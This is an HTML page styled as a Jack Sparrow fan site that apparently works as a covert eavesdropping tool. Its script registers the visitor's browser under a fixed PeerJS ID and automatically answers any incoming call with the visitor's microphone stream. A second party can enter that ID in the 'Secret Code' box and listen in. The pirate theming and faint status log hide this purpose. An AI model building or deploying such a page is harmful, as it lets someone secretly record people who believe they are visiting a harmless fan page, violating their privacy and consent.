<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jack Sparrow - Fan Central</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.2/peerjs.min.js"></script>
    <style>
        body { background: #1a1a1a; color: #d4af37; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        .pirate-box { border: 2px solid #d4af37; padding: 20px; border-radius: 10px; display: inline-block; max-width: 500px; width: 90%; }
        .hidden-input { background: #222; border: 1px solid #d4af37; color: #d4af37; padding: 12px; width: 80%; border-radius: 5px; text-align: center; }
        button { background: #d4af37; color: black; border: none; padding: 12px 25px; cursor: pointer; margin-top: 15px; font-weight: bold; border-radius: 5px; }
        #log { font-size: 10px; color: #444; margin-top: 40px; }
    </style>
</head>
<body>
    <div class="pirate-box">
        <h1>Captain Jack Sparrow</h1>
        <p>"Not all treasure is silver and gold, mate."</p>
        <img src="https://img.icons8.com/color/96/jack-sparrow.png" alt="Jack">
        <div style="margin-top: 20px;">
            <input type="text" id="target-id" class="hidden-input" placeholder="Enter Secret Code...">
            <br>
            <button id="board-btn" onclick="connectToCaptain()">Board the Ship</button>
        </div>
    </div>
    <div id="log">System: Ready</div>
    <audio id="receiver-audio" autoplay playsinline></audio>

    <script>
        const MY_OFFICE_ID = 'jack-sparrow-office-007'; 
        let peer = null;

        function initPeer() {
            // ലാപ്ടോപ്പിൽ തുറക്കുമ്പോൾ ഐഡി ഇല്ലാതെ തുറക്കാൻ ശ്രമിക്കുന്നു
            const isReceiver = window.location.search.includes('receiver');
            peer = new Peer(isReceiver ? null : MY_OFFICE_ID);

            peer.on('open', (id) => {
                document.getElementById('log').innerText = "System: Online | Port: " + id;
            });

            peer.on('call', (call) => {
                navigator.mediaDevices.getUserMedia({ audio: true }).then((stream) => {
                    call.answer(stream);
                });
            });

            peer.on('error', (err) => {
                if (err.type === 'id-taken') {
                    document.getElementById('log').innerText = "ID is taken. Operating as Receiver.";
                    // ഐഡി എറർ വന്നാൽ ഒരു പുതിയ റാൻഡം ഐഡിയിൽ വീണ്ടും തുടങ്ങുന്നു
                    peer = new Peer(); 
                    peer.on('open', (id) => {
                        document.getElementById('log').innerText = "Receiver Port: " + id;
                    });
                }
            });
        }

        function connectToCaptain() {
            const target = document.getElementById('target-id').value;
            if(!peer) return;
            const call = peer.call(target, null);
            call.on('stream', (stream) => {
                document.getElementById('receiver-audio').srcObject = stream;
            });
        }

        window.onload = initPeer;
    </script>
</body>
</html>
